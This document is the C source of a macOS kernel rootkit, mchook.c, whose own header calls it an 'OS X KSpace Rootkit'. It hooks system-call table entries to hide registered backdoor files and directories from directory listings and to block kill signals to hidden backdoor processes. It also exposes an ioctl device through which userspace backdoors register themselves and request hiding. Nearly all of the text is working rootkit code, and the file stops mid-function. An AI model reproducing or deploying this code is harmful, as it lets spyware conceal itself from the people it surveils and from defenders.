/*
 * McHook, mchook.c
 *  OS X KSpace Rootkit
 * 
 * [Features]
 * x sysent hooking for bsd syscalls
 * x mach_trap_table hooking for mach traps
 * x process hiding
 *    x uspace->kspace proc hiding handler (kill)
 * x kext hiding
 * x filesystem hiding
 *    x uspace->kspace communication channel (ioctl)
 * x Data structures keeping track of USpace Backdoor(s) pid
 *   and Path(s)/Filename(s)
 *
 *
 * Created by revenge on 20/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#include <mach/mach_types.h>
#include <sys/systm.h>
#include <sys/kernel.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <sys/dirent.h>
#include <sys/conf.h>
#include <sys/attr.h>

#include <sys/ioctl.h>
#include <miscfs/devfs/devfs.h>

#include <stdint.h>

#include "mchook.h"

#pragma mark -
#pragma mark Global define(s)
#pragma mark -

#define MK_MBUF       1
#define PLENGTH       6

#define IM            "appleHID"
#define OSAX          "appleOsax"
#define KERNEL_BASE   0xffffff8000200000 // SL 10.6.4

//#define DEBUG


#pragma mark -
#pragma mark Global variables
#pragma mark -

static reg_backdoors_t *g_reg_backdoors[MAX_BACKDOOR_ENTRIES];
static exclusion_list_t g_exclusion_list[1] = {
  "launchd", 1,
};

static int g_process_excluded = 1;
static int g_kext_hidden      = 0;

// Holding current kmod entry pointer
//static kmod_info_t *currentK;
// Holding the real time uspace backdoor count
static int g_backdoor_counter = 0;
// Holding the uspace backdoor count (never decreasing)
static int g_backdoor_counter_static = 0;
// Holding the next free index for hiddendDirs[] (just free'd)
static int g_next_free_index = -1;
// Index for the s_dentries struct
//static int g_backdoor_current = -1;
// BSD IOCTL stuff
static int major = -1;
static void *devfs_handle = 0;

static int g_os_major   = 0;
static int g_os_minor   = 0;
static int g_os_bugfix  = 0;

static int g_symbols_resolved = 0;

// Character device switch table
static struct cdevsw chardev = {
  cdev_open,  // open
  cdev_close, // close
  eno_rdwrt,  // read
  eno_rdwrt,  // write
  cdev_ioctl, // ioctl
  eno_stop,   // stop
  eno_reset,  // reset
  0,          // ttys
  eno_select, // select
  eno_mmap,   // mmap
  eno_strat,  // strategy
  eno_getc,   // getc
  eno_putc,   // putc
  0           // type
};

#pragma mark -
#pragma mark Main IOCTL Functions
#pragma mark -

static int cdev_open(dev_t dev, int flags, int devtype, struct proc *p) {
  return 0;
}

static int cdev_close(dev_t dev, int flags, int devtype, struct proc *p) {
  return 0;
}

static int cdev_ioctl(dev_t dev,
                      u_long cmd,
                      caddr_t data,
                      int fflag,
                      struct proc *p)
{
  int error   = 0;
  char username[MAX_USER_SIZE];
  
  switch (cmd) {
#pragma mark MCHOOK_INIT
    case MCHOOK_INIT: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_INIT called\n");
#endif
      if (data) {
        //pid_t pid = p->p_pid;
        strncpy(username, (char *)data, MAX_USER_SIZE);
#ifdef DEBUG
        printf("[MCHOOK] INIT FOR USER %s with pid %d\n", username, p->p_pid);
#endif
        
        backdoor_init(username, p);
      }
      
      break;
    }
#pragma mark MCHOOK_HIDEK
    case MCHOOK_HIDEK: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_HIDEK called\n");
#endif
      
      if (g_symbols_resolved == 1) {
        // TODO: Hide KEXT is unstable
        
        if (g_os_major == 10 && g_os_minor == 5) {
#ifdef DEBUG
          printf("[MCHOOK] Not hiding kext for leopard, unstable\n");
#endif
          
          //hide_kext_leopard();
        }
        else if (g_os_major == 10 && g_os_minor == 6) {
#ifdef DEBUG
          printf("[MCHOOK] Snow leopard not supported yet for KEXT hiding\n");
#endif
        }
      }
      else {
#ifdef DEBUG
        printf("[MCHOOK] Error, symbols not correctly resolved\n");
#endif
      }

      break;
    }
#pragma mark MCHOOK_HIDEP
    case MCHOOK_HIDEP: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_HIDEP called\n");
#endif
      if (data && g_symbols_resolved == 1) {
        strncpy(username, (char *)data, MAX_USER_SIZE);
#ifdef DEBUG
        pid_t pid = p->p_pid;
        printf("[MCHOOK] Hiding PID: %d\n", pid);
#endif
        
        int backdoor_index = 0;
        
        if ((backdoor_index = get_backdoor_index(p, username)) == -1) {
#ifdef DEBUG
          printf("[MCHOOK] ERR: get_backdoor_index returned -1 in HIDEP\n");
#endif
          return error;
        }
        
        if (g_reg_backdoors[backdoor_index]->isProcHidden == 1) {
#ifdef DEBUG
          printf("[MCHOOK] ERR: Backdoor is already hidden\n");
#endif
          return error;
        }
        
        if (hide_proc(p, username, backdoor_index) == -1) {
#ifdef DEBUG
          printf("[MCHOOK] hide_proc failed\n");
#endif
        }
      }
      break;
    };
#pragma mark MCHOOK_HIDED
    case MCHOOK_HIDED: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_HIDED called\n");
#endif
      if (data) {
        char dirName[MAX_DIRNAME_SIZE];
        strncpy(dirName, (char *)data, MAX_DIRNAME_SIZE);
        add_dir_to_hide(dirName, p->p_pid);
#ifdef DEBUG
        printf("[MCHOOK] pid (%d)\n", p->p_pid);
#endif
      }
      break;
    };
#pragma mark MCHOOK_UNREGISTER
    case MCHOOK_UNREGISTER: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_UNREGISTER called\n");
#endif
      if (data && g_symbols_resolved == 1) {
        strncpy(username, (char *)data, MAX_USER_SIZE);
        
#ifdef DEBUG
        printf("[MCHOOK] Unregister for user: %s\n", username);
#endif
        
#ifdef DEBUG
        printf("[MCHOOK] backdoorCounter: %d\n", g_backdoor_counter);
        printf("[MCHOOK] backdoorCounterStatic: %d\n", g_backdoor_counter_static);
#endif
#if 0
        //
        // g_backdoor_current could get messed up (e.g. 2 backdoors on the same machine
        // one gets uninstalled, the other is still active but there's no way
        // for it to be refereced by g_backdoor_current, thus we call get_backdoor_index
        //
        if (g_backdoor_current == -1) {
          if ((g_backdoor_current = get_backdoor_index(p, username)) == -1) {
#ifdef DEBUG
            printf("[MCHOOK] unregistering err - backdoor not registered?!!\n");
#endif
          }
        }
          
        if (g_backdoor_current != -1
            && g_reg_backdoors[g_backdoor_current]->isProcHidden == 1) {
#ifdef DEBUG
          printf("[MCHOOK] Re-linking process %d\n", p->p_pid);
#endif
        
          unhide_proc(p);
        }
#endif
        int backdoor_index;
        
        if ((backdoor_index = get_backdoor_index(p, username)) == -1) {
#ifdef DEBUG
          printf("[MCHOOK] ERR: get_backdoor_index returned -1 in UNREGISTER\n");
#endif
          
          return error;
        }
        
        if (g_reg_backdoors[backdoor_index]->isProcHidden == 1) {
#ifdef DEBUG
          printf("[MCHOOK] Backdoor is hidden, unhiding\n");
#endif
          unhide_proc(p, backdoor_index);
        }
        
        //g_backdoor_current = -1;
        dealloc_meh(username, p->p_pid);
        
        if (g_backdoor_counter == 0) {
#ifdef DEBUG
          printf("[MCHOOK] No more backdoor left, unhooking\n");
#endif
          remove_hooks();
        }
      }
      break;
    };
#pragma mark MCHOOK_GET_ACTIVES
    case MCHOOK_GET_ACTIVES: {
      *data = g_backdoor_counter;
      break;
    };
#pragma mark MCHOOK_SOLVE_SYM
    case MCHOOK_SOLVE_SYM: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_SOLVE_SYM called\n");
#endif
      
      if (data) {
        symbol_t *syms = (symbol_t *)data;
        
#ifdef DEBUG
        printf("[MCHOOK] hash   : 0x%08x\n", syms->hash);
        printf("[MCHOOK] symbol : 0x%08x\n", syms->symbol);
#endif
        if (g_symbols_resolved == 1)
          return error;
        
        switch (syms->hash) {
          case KMOD_HASH: {
#ifdef DEBUG
            printf("[MCHOOK] kmod symbol received\n");
#endif
            i_kmod = (kmod_info_t *)syms->symbol;
            break;
          }
          case NSYSENT_HASH: {
#ifdef DEBUG
            printf("[MCHOOK] nsysent symbol received\n");
#endif
            i_nsysent = (int *)syms->symbol;
#ifdef DEBUG
            printf("[MCHOOK] nsysent: %d\n", *i_nsysent);
#endif
            break;
          }
          case TASKS_HASH: {
#ifdef DEBUG
            printf("[MCHOOK] tasks symbol received\n");
#endif
            i_tasks = (queue_head_t *)syms->symbol;
            break;
          }
          case ALLPROC_HASH: {
#ifdef DEBUG
            printf("[MCHOOK] allproc symbol received\n");
#endif
            i_allproc = (struct proclist *)syms->symbol;
            break;
          }
          case TASKS_COUNT_HASH: {
#ifdef DEBUG
            printf("[MCHOOK] tasks_count symbol received\n");
#endif
            i_tasks_count = (int *)syms->symbol;
            break;
          }
          case NPROCS_HASH: {
#ifdef DEBUG
            printf("[MCHOOK] nprocs symbol received\n");
#endif
            i_nprocs = (int *)syms->symbol;
            break;
          }
          case TASKS_THREADS_LOCK_HASH: {
#ifdef DEBUG
            printf("[MCHOOK] tasks_threads_lock symbol received\n");
#endif
            i_tasks_threads_lock = (lck_mtx_t *)syms->symbol;
            break;
          }
          case PROC_LOCK_HASH: {
#ifdef DEBUG
            printf("[MCHOOK] proc_lock symbol received\n");
#endif
            i_proc_lock = (void *)syms->symbol;
            break;
          }
          case PROC_UNLOCK_HASH: {
#ifdef DEBUG
            printf("[MCHOOK] proc_unlock symbol received\n");
#endif
            i_proc_unlock = (void *)syms->symbol;
            break;
          }
          case PROC_LIST_LOCK_HASH: {
#ifdef DEBUG
            printf("[MCHOOK] proc_list_lock symbol received\n");
#endif
            i_proc_list_lock = (void *)syms->symbol;
            break;
          }
          case PROC_LIST_UNLOCK_HASH: {
#ifdef DEBUG
            printf("[MCHOOK] proc_list_unlock symbol received\n");
#endif
            i_proc_list_unlock = (void *)syms->symbol;
            break;
          }
          default: {
#ifdef DEBUG
            printf("[MCHOOK] symbol not supported yet\n");
#endif
            break;
          }
        }
      }
      break;
    };
#pragma mark MCHOOK_FIND_SYS
    case MCHOOK_FIND_SYS: {
#ifdef DEBUG
      printf("[MCHOOK] MCHOOK_FIND_SYS called\n");
#endif
      if (data) {
        os_version_t *os_ver = (os_version_t *)data;
        g_os_major  = os_ver->major;
        g_os_minor  = os_ver->minor;
        g_os_bugfix = os_ver->bugfix;
        
        // Find sysent table
        _sysent = find_sysent(os_ver);
        if (_sysent == NULL) {
#ifdef DEBUG
          printf("[MCHOOK] sysent not found\n");
#endif
        }
        else {
          if (check_symbols_integrity()) {
#ifdef DEBUG
            printf("[MCHOOK] All symbols were resolved\n");
#endif
            place_hooks();
          }
          else {
#ifdef DEBUG
            printf("[MCHOOK] Some symbols were not resolved\n");
#endif
          }
        }

      }
      break;
    }
    default: {
#ifdef DEBUG
      printf("[MCHOOK] Unknown command called dudeeeee: %lu\n", cmd);
#endif
      error = EINVAL;
      break;
    };
  }
  
  return error;
}

#pragma mark -
#pragma mark Hooks
#pragma mark -

int hook_getdirentries(struct proc *p,
                       struct mk_getdirentries_args *uap,
                       int *retval)
{
  struct dirent *tmp, *current;
  long size, count, length = 0;
  int flag = 0;
  int i_entry, i_path;
  
  real_getdirentries(p, uap, retval);
  size = retval[0];
  
  if (size > 0
      && check_for_process_exclusions(p->p_pid) == -1) {
    MALLOC(tmp, struct dirent *, size, MK_MBUF, M_WAITOK);
    copyin(uap->buf, tmp, size);
    
    count = size;
    current = (struct dirent *)(char *)tmp;
    
    while (count > 0) {
      length = current->d_reclen;
      count -= length;
      
      for (i_entry = 0; i_entry < g_backdoor_counter_static; i_entry++) {
        //
        // Enforce checks in order to avoid situation where all the files are hidden
        // from the disk since the g_reg_backdoors structure is inconsistent
        //
        if (g_reg_backdoors[i_entry]->isActive == 1) {
          for (i_path = 0; i_path < g_reg_backdoors[i_entry]->pathCounter; i_path++) {
            if (strncmp(g_reg_backdoors[i_entry]->path[i_path], "",
                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0)
              continue;
            
            if (strncmp((char *)&(current->d_name),
                        g_reg_backdoors[i_entry]->path[i_path],
                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0) {
              if (count != 0) {
                // Remove the entry from buf
                memmove((char *)current, (char *)current + length, count);
                flag = 1;
              }
              // Adjust the size since we removed an entry
              size -= length;
              break;
            }
          }
        }
        
        if (flag)
          break;
      }
#if 0
      if (strncmp((char *)&(current->d_name), PREFIX, PLENGTH) == 0) {
        if (count != 0) {
          // Remove the entry from buf
          bcopy((char *)current + length, (char *)current, count - length);
          flag = 1;
        }
        // Adjust the size since we removed an entry
        size -= length;
      }
#endif
      // Last dir always has length of 0
      if (current->d_reclen == 0)
        count = 0;
      // Point to the next struct entry if we didn't remove anything
      if (count != 0 && flag == 0)
        current = (struct dirent *)((char *)current + length);
      flag = 0;
    }
    
    // Update the return size
    *retval = size;
    // Copy back to uspace the modified buffer
    copyout(tmp, uap->buf, size);
    FREE(tmp, MK_MBUF);
  }
  
  return(0);
}

int hook_getdirentries64(struct proc *p,
                         struct mk_getdirentries64_args *uap,
                         int *retval)
{
  void *tmp;
  struct direntry *current;
  long size, count, length = 0;
  int flag = 0;
  int i_entry, i_path;
  
  real_getdirentries64(p, uap, retval);
  size = retval[0];

  if (size > 0
      && check_for_process_exclusions(p->p_pid) == -1) {
    MALLOC(tmp, struct direntry *, size, MK_MBUF, M_WAITOK);
    copyin(uap->buf, tmp, size);

    count = size;
    current = (struct direntry *)(char *)tmp;
    
    while (count > 0) {
      length = current->d_reclen;
      count -= length;

      for (i_entry = 0; i_entry < g_backdoor_counter_static; i_entry++) {
        //
        // Enforce checks in order to avoid situation where all the files are hidden
        // from the disk since the g_reg_backdoors structure is inconsistent
        //
        if (g_reg_backdoors[i_entry]->isActive == 1) {
          for (i_path = 0; i_path < g_reg_backdoors[i_entry]->pathCounter; i_path++) {
            if (strncmp(g_reg_backdoors[i_entry]->path[i_path], "",
                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0)
              continue;
            
            if (strncmp((char *)&(current->d_name),
                        g_reg_backdoors[i_entry]->path[i_path],
                        strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0) {
              if (count != 0) {
                // Remove the entry from buf
                memmove((char *)current, (char *)current + length, count);
                flag = 1;
              }
              // Adjust the size since we removed an entry
              size -= length;
              break;
            }
          }            
        }
        
        if (flag)
          break;
      }
#if 0
      if (strncmp((char *)&(current->d_name), PREFIX, PLENGTH) == 0) {
        if (count != 0) {
          // Remove the entry from buf
          bcopy((char *)current + length, (char *)current, count - length);
          flag = 1;
        }
        // Adjust the size since we removed an entry
        size -= length;
      }
#endif
      // Last entry always has length of 0
      if (current->d_reclen == 0)
        count = 0;
      // Point to the next struct entry
      if (count != 0 && flag == 0)
        current = (struct direntry *)((char *)current + length);
      flag = 0;
    }
    
    // Update the return size
    *retval = size;
    // Copy back to uspace the modified buffer
    copyout(tmp, uap->buf, size);
    FREE(tmp, MK_MBUF);
  }

  return(0);
}

int hook_getdirentriesattr(struct proc *p,
                           struct mk_getdirentriesattr_args *uap,
                           int *retval)
{
  char procName[20];
  char *curr_entry = NULL;
  
  attr_list_t al;
  int success = 0;
  int flag = 0;
  int curr_backdoor, curr_path;
  int index = 0;
  
  u_int32_t count         = 0;
  u_int32_t entry_size    = 0;
  
  attribute_buffer_t *buf, *thisEntry;

  success = real_getdirentriesattr(p, uap, retval);
  proc_name(p->p_pid, procName, sizeof(procName));
  
#ifdef DEBUG_VERBOSE
  printf("p_start sec: %d for %s\n", (int)p->p_start.tv_sec, procName);
#endif
  
  if (check_for_process_exclusions(p->p_pid) == -1) {
#ifdef DEBUG_VERBOSE
    printf("getdirentriesattr called by %s\n", procName); 
    printf("ATTRLIST - %s commonattr %08x | volattr %08x | fileattr %08x | dirattr %08x | forkattr %08x | %sfollow\n",
           p->p_comm, al.commonattr, al.volattr, al.fileattr, al.dirattr, al.forkattr,
           (uap->options & FSOPT_NOFOLLOW) ? "no" : "");
    //getAttributesForBitFields(al);
#endif
    
    copyin(uap->alist, (caddr_t)&al, sizeof(al));
    copyin(uap->count, (caddr_t)&count, sizeof(count));

#ifdef DEBUG_VERBOSE
    printf("bufferSize: %d\n", (int)uap->buffersize);
#endif
    
    MALLOC(buf, attribute_buffer_t *, uap->buffersize, MK_MBUF, M_WAITOK);
    copyin(uap->buffer, (caddr_t)buf, uap->buffersize);
    
    thisEntry = (attribute_buffer_t *)(char *)buf;
    
    int _tmp_size = uap->buffersize;
    index = count;
    
    while (_tmp_size > 0 && index > 0) {
      entry_size = thisEntry->length;
      _tmp_size -= entry_size;
      index -= 1;
      
      curr_entry = (char *)&thisEntry->name;
      curr_entry += (unsigned int)thisEntry->name.attr_dataoffset;
      
      for (curr_backdoor = 0; curr_backdoor < g_backdoor_counter_static; curr_backdoor++) {
        //
        // Enforce checks in order to avoid situation where all the files are hidden
        // from the disk since the g_reg_backdoors structure is inconsistent
        //
        if (g_reg_backdoors[curr_backdoor]->isActive == 1) {
          for (curr_path = 0; curr_path < g_reg_backdoors[curr_backdoor]->pathCounter; curr_path++) {
            if (strncmp(g_reg_backdoors[curr_backdoor]->path[curr_path],
                        "",
                        strlen(g_reg_backdoors[curr_backdoor]->path[curr_path])) == 0)
              continue;
            
            if (strncmp(curr_entry,
                        g_reg_backdoors[curr_backdoor]->path[curr_path],
                        strlen(g_reg_backdoors[curr_backdoor]->path[curr_path])) == 0) {
              if ((strncmp(curr_entry, IM, strlen(IM)) == 0)
                 || (strncmp(curr_entry, OSAX, strlen(OSAX)) == 0)) {
                if (p->p_start.tv_sec == 0) {
#ifdef DEBUG
                  printf("Entry matched for %s (first time) - skipping\n", curr_entry);
#endif
                  
                  p->p_start.tv_sec = 1;
                  
                  continue;
                }
              }
#ifdef DEBUG
              printf("%s REQUESTED %s\n", procName, curr_entry);
#endif
              
              // Remove the entry from buf
              memmove((char *)thisEntry,
                      (char *)((unsigned int)thisEntry + entry_size),
                      _tmp_size);
              flag = 1;
              
              // Adjust the counter since we removed an entry
              count--;
              
              break;
            }
          }
        }
        
        if (flag)
          break;
      }

      // Advance to the next entry
      if (_tmp_size != 0 && flag == 0)
        thisEntry = (attribute_buffer_t *)((unsigned int)thisEntry + entry_size);
    }
    
    // Back to uspace
    copyout((caddr_t)buf, uap->buffer, uap->buffersize);
    copyout(&count, uap->count, sizeof(count));
    
    FREE(buf, MK_MBUF);
  }
  else {
#ifdef DEBUG
    printf("Process excluded from hiding: %s\n", procName);
#endif
  }
  
  return success;
}

int hook_kill(struct proc *p,
              struct mk_kill_args *uap,
              int *retval)
{
	int i = 0;
  
  for (; i < g_backdoor_counter_static; i++) {
    if (g_reg_backdoors[i]->isActive        == 1
        && g_reg_backdoors[i]->isProcHidden == 1
        && g_reg_backdoors[i]->p->p_pid     == uap->pid) {
      return 0;
    }
  }
  
  return real_kill(p, uap, retval);
}
  
#if 0
int hook_read(struct proc *p,
              struct mk_read_args *uap,
              int *retval)
{
  int error;
  char buf[1];
  size_t *done;

  error = real_read(p, uap, retval);
  if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0)) {
      return(error);
  }
  copyinstr(uap->cbuf, buf, 1, done);
#ifdef DEBUG
  printf("%c\n", buf[0]);
#endif
  return (error);
}
#endif

#pragma mark -
#pragma mark General purpose functions
#pragma mark -

#ifdef DEBUG
void getAttributesForBitFields(attr_list_t al)
{
  // commonattr checks
  if (al.commonattr & ATTR_CMN_NAME)
    printf("ATTR_CMN_NAME\n");
  if (al.commonattr & ATTR_CMN_DEVID)
    printf("ATTR_CMN_DEVID\n");
  if (al.commonattr & ATTR_CMN_FSID)
    printf("ATTR_CMN_FSID\n");
  if (al.commonattr & ATTR_CMN_OBJTYPE)
    printf("ATTR_CMN_OBJTYPE\n");
  if (al.commonattr & ATTR_CMN_OBJTAG)
    printf("ATTR_CMN_OBJTAG\n");
  if (al.commonattr & ATTR_CMN_OBJID)
    printf("ATTR_CMN_OBJID\n");
  if (al.commonattr & ATTR_CMN_OBJPERMANENTID)
    printf("ATTR_CMN_OBJPERMANENTID\n");
  if (al.commonattr & ATTR_CMN_PAROBJID)
    printf("ATTR_CMN_PAROBJID\n");
  if (al.commonattr & ATTR_CMN_SCRIPT)
    printf("ATTR_CMN_SCRIPT\n");
  if (al.commonattr & ATTR_CMN_CRTIME)
    printf("ATTR_CMN_CRTIME\n");
  if (al.commonattr & ATTR_CMN_MODTIME)
    printf("ATTR_CMN_MODTIME\n");
  if (al.commonattr & ATTR_CMN_CHGTIME)
    printf("ATTR_CMN_CHGTIME\n");
  if (al.commonattr & ATTR_CMN_ACCTIME)
    printf("ATTR_CMN_ACCTIME\n");
  if (al.commonattr & ATTR_CMN_BKUPTIME)
    printf("ATTR_CMN_BKUPTIME\n");
  if (al.commonattr & ATTR_CMN_FNDRINFO)
    printf("ATTR_CMN_FNDRINFO\n");
  if (al.commonattr & ATTR_CMN_OWNERID)
    printf("ATTR_CMN_OWNERID\n");
  if (al.commonattr & ATTR_CMN_GRPID)
    printf("ATTR_CMN_GRPID\n");
  if (al.commonattr & ATTR_CMN_ACCESSMASK)
    printf("ATTR_CMN_ACCESSMASK\n");
  if (al.commonattr & ATTR_CMN_FLAGS)
    printf("ATTR_CMN_FLAGS\n");
  if (al.commonattr & ATTR_CMN_USERACCESS)
    printf("ATTR_CMN_USERACCESS\n");
  if (al.commonattr & ATTR_CMN_EXTENDED_SECURITY)
    printf("ATTR_CMN_EXTENDED_SECURITY\n");
  if (al.commonattr & ATTR_CMN_UUID)
    printf("ATTR_CMN_UUID\n");
  if (al.commonattr & ATTR_CMN_GRPUUID)
    printf("ATTR_CMN_GRPUUID\n");
  if (al.commonattr & ATTR_CMN_FILEID)
    printf("ATTR_CMN_FILEID\n");
  if (al.commonattr & ATTR_CMN_PARENTID)
    printf("ATTR_CMN_PARENTID\n");
  if (al.commonattr & ATTR_CMN_VALIDMASK)
    printf("ATTR_CMN_VALIDMASK\n");
  if (al.commonattr & ATTR_CMN_SETMASK)
    printf("ATTR_CMN_SETMASK\n");
  if (al.commonattr & ATTR_CMN_VOLSETMASK)
    printf("ATTR_CMN_VOLSETMASK\n");
  
  
  // volattr checks
  if (al.volattr & ATTR_VOL_FSTYPE)
    printf("ATTR_VOL_FSTYPE\n");
  if (al.volattr & ATTR_VOL_SIGNATURE)
    printf("ATTR_VOL_SIGNATURE\n");
  if (al.volattr & ATTR_VOL_SIZE)
    printf("ATTR_VOL_SIZE\n");
  if (al.volattr & ATTR_VOL_SPACEFREE)
    printf("ATTR_VOL_SPACEFREE\n");
  if (al.volattr & ATTR_VOL_SPACEAVAIL)
    printf("ATTR_VOL_SPACEAVAIL\n");
  if (al.volattr & ATTR_VOL_MINALLOCATION)
    printf("ATTR_VOL_MINALLOCATION\n");
  if (al.volattr & ATTR_VOL_ALLOCATIONCLUMP)
    printf("ATTR_VOL_ALLOCATIONCLUMP\n");
  if (al.volattr & ATTR_VOL_IOBLOCKSIZE)
    printf("ATTR_VOL_IOBLOCKSIZE\n");
  if (al.volattr & ATTR_VOL_OBJCOUNT)
    printf("ATTR_VOL_OBJCOUNT\n");
  if (al.volattr & ATTR_VOL_FILECOUNT)
    printf("ATTR_VOL_FILECOUNT\n");
  if (al.volattr & ATTR_VOL_DIRCOUNT)
    printf("ATTR_VOL_DIRCOUNT\n");
  if (al.volattr & ATTR_VOL_MAXOBJCOUNT)
    printf("ATTR_VOL_MAXOBJCOUNT\n");
  if (al.volattr & ATTR_VOL_MOUNTPOINT)
    printf("ATTR_VOL_MOUNTPOINT\n");
  if (al.volattr & ATTR_VOL_NAME)
    printf("ATTR_VOL_NAME\n");
  if (al.volattr & ATTR_VOL_MOUNTFLAGS)
    printf("ATTR_VOL_MOUNTFLAGS\n");
  if (al.volattr & ATTR_VOL_MOUNTEDDEVICE)
    printf("ATTR_VOL_MOUNTEDDEVICE\n");
  if (al.volattr & ATTR_VOL_ENCODINGSUSED)
    printf("ATTR_VOL_ENCODINGSUSED\n");
  if (al.volattr & ATTR_VOL_CAPABILITIES)
    printf("ATTR_VOL_CAPABILITIES\n");
  if (al.volattr & ATTR_VOL_ATTRIBUTES)
    printf("ATTR_VOL_ATTRIBUTES\n");
  if (al.volattr & ATTR_VOL_INFO)
    printf("ATTR_VOL_INFO\n");
  if (al.volattr & ATTR_VOL_VALIDMASK)
    printf("ATTR_VOL_VALIDMASK\n");
  if (al.volattr & ATTR_VOL_SETMASK)
    printf("ATTR_VOL_SETMASK\n");
  
  // dirattr checks
  if (al.dirattr & ATTR_DIR_ENTRYCOUNT)
    printf("ATTR_DIR_ENTRYCOUNT\n");
  if (al.dirattr & ATTR_DIR_LINKCOUNT)
    printf("ATTR_DIR_LINKCOUNT\n");
}
#endif

int check_for_process_exclusions(pid_t pid)
{
  char procName[20];
  int i = 0;
  
  proc_name(pid, procName, sizeof(procName));
  
  for (i = 0; i < g_process_excluded; i ++) {
    if (strncmp(procName, g_exclusion_list[i].processName, MAX_USER_SIZE) == 0
        && g_exclusion_list[i].isActive == 1) {
#ifdef DEBUG
      printf("[MCHOOK] Exclusion matched for %s\n", procName);
#endif
      return 1;
    }
  }
  
  return -1;
}

void place_hooks()
{
  if (fl_getdire64 == 0) {
    real_getdirentries64 = (getdirentries64_func_t *)_sysent[SYS_getdirentries64].sy_call;
    _sysent[SYS_getdirentries64].sy_call = (sy_call_t *)hook_getdirentries64;
    fl_getdire64 = 1;
  }

  if (fl_getdire == 0) {
    real_getdirentries = (getdirentries_func_t *)_sysent[SYS_getdirentries].sy_call;
    _sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_getdirentries;
    fl_getdire = 1;
  }
  
  if (fl_getdirentriesattr == 0) {
    real_getdirentriesattr = (getdirentriesattr_func_t *)_sysent[SYS_getdirentriesattr].sy_call;
    _sysent[SYS_getdirentriesattr].sy_call = (sy_call_t *)hook_getdirentriesattr;
    fl_getdirentriesattr = 1;
  }
  
  if (fl_kill == 0) {
    real_kill = (kill_func_t *)_sysent[SYS_kill].sy_call;
    _sysent[SYS_kill].sy_call = (sy_call_t *)hook_kill;
    fl_kill = 1;
  }
  
#ifdef DEBUG
  printf("[MCHOOK] Hooks in place\n");
#endif
}

void remove_hooks()
{
  if (fl_getdire64) {
    _sysent[SYS_getdirentries64].sy_call = (sy_call_t *)real_getdirentries64;
    fl_getdire64 = 0;
  }
  
  if (fl_getdire) {
    _sysent[SYS_getdirentries].sy_call = (sy_call_t *)real_getdirentries;
    fl_getdire = 0;
  }
  
  if (fl_getdirentriesattr) {
    _sysent[SYS_getdirentriesattr].sy_call = (sy_call_t *)real_getdirentriesattr;
    fl_getdirentriesattr = 0;
  }
  
  if (fl_kill) {
    _sysent[SYS_kill].sy_call = (sy_call_t *)real_kill;
    fl_kill = 0;
  }
}

void add_dir_to_hide(char *dirName, pid_t pid)
{
  int i = 0;
  int z = 0;
  
#ifdef DEBUG
  printf("[MCHOOK] addDirToHide called\n");
  printf("[MCHOOK] Hiding (%s) for pid (%d)\n", dirName, pid);
#endif
  
  for (i = 0; i < g_backdoor_counter_static; i++) {
    if (g_reg_backdoors[i]->pid == pid
        && g_reg_backdoors[i]->isActive == 1) {
      for (z = 0; z < g_reg_backdoors[i]->pathCounter; z ++) {
        if (strncmp(dirName, g_reg_backdoors[i]->path[z], MAX_DIRNAME_SIZE) == 0) {
#ifdef DEBUG
          printf("[MCHOOK] Path already registered (%s)!\n", dirName);
#endif
                  
          return;
        }
      }
      
      if (g_reg_backdoors[i]->pathCounter < MAX_PATH_ENTRIES) {
        strncpy((char *)g_reg_backdoors[i]->path[g_reg_backdoors[i]->pathCounter],
                dirName, MAX_DIRNAME_SIZE);
        
#ifdef DEBUG
        printf("[MCHOOK] DIR Hidden: %s\n", g_reg_backdoors[i]->path[g_reg_backdoors[i]->pathCounter]);
#endif
        
        g_reg_backdoors[i]->pathCounter++;
        
#ifdef DEBUG
        printf("[MCHOOK] backdoorCounter: %d\n", g_backdoor_counter);
        printf("[MCHOOK] backdoor pathCounter: %d\n", 
               g_reg_backdoors[i]->pathCounter);
#endif
      }
    }
  }
}

void backdoor_init(char *userName, proc_t p)
{
  // TODO: I should add here any further authentication/registration method
  int _index        = 0;
  int i             = 0;
  int backdoorFound = -1;
  
  if (g_backdoor_counter == 0) {
#ifdef DEBUG
    printf("[MCHOOK] First backdoor, hooking\n");
#endif
  }
  else {
    for (i = 0; i < g_backdoor_counter_static; i ++) {
#ifdef DEBUG
      printf("userName: %s\n", userName);
      printf("userName registered: %s\n", g_reg_backdoors[i]->username);
#endif
      if (strncmp(g_reg_backdoors[i]->username, userName, MAX_USER_SIZE) == 0
          && g_reg_backdoors[i]->pid == p->p_pid) {
#ifdef DEBUG
        printf("Backdoor already registered, checking if it's active\n");
#endif
        if (g_reg_backdoors[i]->isActive == 1) {
#ifdef DEBUG
          printf("Backdoor already registered and active\n");
#endif
          g_reg_backdoors[i]->pid = p->p_pid;
          //g_backdoor_current = i;
          
          return;
        }
        else {
#ifdef DEBUG
          printf("Backdoor already registered but not active\n");
#endif
          backdoorFound = i;
          break;
        }
      }
    }
  }
  
  if (backdoorFound != -1) {
    for (i = 0; i < g_reg_backdoors[backdoorFound]->pathCounter; i++) {
      memset(g_reg_backdoors[backdoorFound]->path[i], '\0', MAX_DIRNAME_SIZE);
    }
    
    _index = backdoorFound;
    
    if (g_backdoor_counter_static == 0)
      g_backdoor_counter_static++;
    
    if (backdoorFound == g_next_free_index)
      g_next_free_index = -1;
  }
  else if (g_next_free_index != -1) {
    //MALLOC(g_reg_backdoors[g_next_free_index], t_dentries *, sizeof(t_dentries), MK_MBUF, M_WAITOK);
    for (i = 0; i < g_reg_backdoors[g_next_free_index]->pathCounter; i++) {
      memset(g_reg_backdoors[g_next_free_index]->path[i], '\0', MAX_DIRNAME_SIZE);
      //strncpy(g_reg_backdoors[g_next_free_index]->path[i], '\0', strlen(g_reg_backdoors[g_next_free_index]->path[i]));
    }
    
    memset(g_reg_backdoors[g_next_free_index]->username, '\0', MAX_USER_SIZE);
    
